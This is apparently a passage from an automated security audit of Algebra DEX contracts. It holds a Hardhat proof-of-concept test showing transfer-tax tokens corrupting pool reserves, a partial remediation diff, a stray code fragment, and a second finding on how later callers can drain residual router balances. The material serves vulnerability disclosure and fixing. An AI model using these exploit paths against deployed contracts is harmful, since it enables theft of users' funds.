      ? await swapTargetCallee.swapExact1For0(pool, swapIn, recipient.address, MAX_SQRT_RATIO - 1n)
      : await swapTargetCallee.swapExact0For1(pool, swapIn, recipient.address, MIN_SQRT_RATIO + 1n);
    const receipt = await tx.wait();

    let nominalOutput = 0n;
    for (const log of receipt!.logs) {
      try {
        const parsed = pool.interface.parseLog(log as any);
        if (parsed?.name === 'Swap') {
          const amount0 = parsed.args.amount0 as bigint;
          const amount1 = parsed.args.amount1 as bigint;
          nominalOutput = taxedIsToken0 ? -amount0 : -amount1;
        }
      } catch (_) {}
    }

    const recipientAfter = await taxed.balanceOf(recipient.address);
    const actualReceived = recipientAfter - recipientBefore;
    expect(nominalOutput).to.be.gt(0n);
    expect(actualReceived).to.be.lt(nominalOutput);

    const afterFirstSwap = await reserveAndBalance();
    expect(afterFirstSwap.reserve).to.be.gt(afterFirstSwap.balance);
    expect(afterFirstSwap.gap).to.be.gt(0n);

    const secondTx = taxedIsToken0
      ? await swapTargetCallee.swapExact1For0(pool, swapIn, recipient.address, MAX_SQRT_RATIO - 1n)
      : await swapTargetCallee.swapExact0For1(pool, swapIn, recipient.address, MIN_SQRT_RATIO + 1n);
    await secondTx.wait();

    const afterSecondSwap = await reserveAndBalance();
    expect(afterSecondSwap.gap).to.be.gt(afterFirstSwap.gap);

    // burn(0) is a public pool entry point that executes _updateReserves(); the
    // vulnerable implementation leaves balance<reserve deficits unrepaired.
    await pool.burn(minTick, maxTick, 0, '0x');
    const afterReconciliationAttempt = await reserveAndBalance();
    expect(afterReconciliationAttempt.balance).to.eq(afterSecondSwap.balance);
    expect(afterReconciliationAttempt.gap).to.eq(afterSecondSwap.gap);

    // The tracked reserve says this whole nominal amount exists, but the real
    // taxed-token balance cannot cover an outbound transfer of that amount.
    await expect(
      pool.flash(
        recipient.address,
        taxedIsToken0 ? afterReconciliationAttempt.reserve : 0n,
        taxedIsToken0 ? 0n : afterReconciliationAttempt.reserve,
        '0x'
      )
    ).to.be.revertedWithCustomError(pool, 'transferFailed');
  });
});
```

### Considerations

PoC executed successfully in the core Hardhat harness (`unit:cryptoalgebra-integral-core`). It uses a test ERC-20 that charges a sender-side and recipient-side transfer tax, then drives the real `AlgebraPool.mint`, `AlgebraPool.swap`, `AlgebraPool.burn(0)`, and `AlgebraPool.flash` public entry points. The passing test proves recipient underpayment versus the pool-emitted nominal swap output, accumulation of `reserve > balance` deficits after taxed outflows, failure of `_updateReserves()` to repair the deficit, and a later `flash` transfer reverting with `transferFailed` while tracked reserves claim the nominal amount exists. It does not model a rebase token; it proves the fee/tax-transfer variant of the reported finding.
### Validation reasoning

PoC validation command completed successfully.
## Remediation
### Explanation

Reject outbound token transfers unless the pool is debited and the recipient is credited by exactly the requested amount, preventing sender/recipient transfer taxes from corrupting accounting or underpaying recipients. Also clamp tracked reserves to observed balances during reconciliation so external balance decreases such as downward rebases cannot leave persistent stale reserve excesses.
### Patch

```diff
diff --git a/src/core/contracts/base/ReservesManager.sol b/src/core/contracts/base/ReservesManager.sol
--- a/src/core/contracts/base/ReservesManager.sol
+++ b/src/core/contracts/base/ReservesManager.sol
@@ -1,94 +1,99 @@
 // SPDX-License-Identifier: BUSL-1.1
 pragma solidity =0.8.20;
 
 import '../libraries/SafeCast.sol';
 import './AlgebraPoolBase.sol';
 
 /// @title Algebra reserves management abstract contract
 /// @notice Encapsulates logic for tracking and changing pool reserves
 /// @dev The reserve mechanism allows the pool to keep track of unexpected increases in balances
 abstract contract ReservesManager is AlgebraPoolBase {
   using SafeCast for uint256;
 
   /// @dev The tracked token0 and token1 reserves of pool
   uint128 internal reserve0;
   uint128 internal reserve1;
 
   /// @inheritdoc IAlgebraPoolState
```

```
            0,

        amountInCached = DEFAULT_AMOUNT_IN_CACHED;
```

## Description

`PeripheryPayments.pay` treats the router's entire native balance as available funding whenever it is at least the requested WNative amount, without binding that balance to the current call or payer. A native-input exact-output swap can therefore consume only its actual input from `msg.value` and leave the unused `amountInMaximum` in the router when the caller omits the separately documented refund call. `refundNativeToken`, `unwrapWNativeToken`, and the sweep helpers are callable by any account and transfer the router's full current balance to caller-selected recipients, so a later account can withdraw that residue; it can also use the residue to fund an exact-output swap whose output recipient is the attacker. The same whole-balance behavior exposes WNative and ERC-20 output accidentally left at the router, including output sent to `address(this)` through a zero recipient. `multicall` correctly preserves context and rolls back failed subcalls, but it provides no per-subcall balance isolation or provenance accounting.
## Root cause

Payment and cleanup helpers use contract-wide balances as an unscoped pooled fund. They do not track which caller supplied each asset or restrict residual withdrawal and native-input funding to the transaction that created the balance.
## Impact

A later caller can take native, WNative, or ERC-20 assets left by an earlier user without that user's approval, and the native residue can be converted into attacker-directed swap output. The loss is bounded only by the router's accumulated residual balance and can be material when users submit conservative exact-output maxima or omit cleanup.
